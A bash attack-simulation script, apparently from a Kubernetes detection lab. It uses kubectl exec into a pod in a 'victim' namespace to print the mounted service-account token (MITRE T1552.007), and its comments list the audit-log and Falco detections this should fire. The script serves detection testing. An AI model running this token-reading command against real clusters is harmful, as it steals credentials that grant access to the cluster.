#!/bin/bash
# ============================================================================
# Attack Simulation: Exec into a Victim Pod (Steal SA Token via API)
# MITRE ATT&CK: T1552.007 - Unsecured Credentials: Container API
# Stratus technique: k8s.credential-access.steal-serviceaccount-token
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: the create pods/exec event in AKSAuditAdmin.
# ============================================================================
#
# NOTE ON COVERAGE: the apiserver logs the `create pods/exec` request, but the
# actual token READ inside the target pod is off-log to the API server — that
# read is caught on the RUNTIME plane by Falco (detections/falco/token-theft.yaml).
# This is a textbook two-plane technique: API sees the exec, Falco sees the read.

set -e
TARGET_NS="victim"
TARGET=$(kubectl get pod -n "$TARGET_NS" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

if [ -z "$TARGET" ]; then
  echo "[!] No pod found in namespace '$TARGET_NS' to exec into."
  exit 1
fi

echo "[*] Exec into $TARGET_NS/$TARGET and reading its mounted SA token..."
kubectl exec -n "$TARGET_NS" "$TARGET" -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token || true

echo ""
echo "[*] Expected API detection: create pods/exec  (AKSAuditAdmin)"
echo "[*] Expected runtime detection: Falco 'Read ServiceAccount Token in Container'"
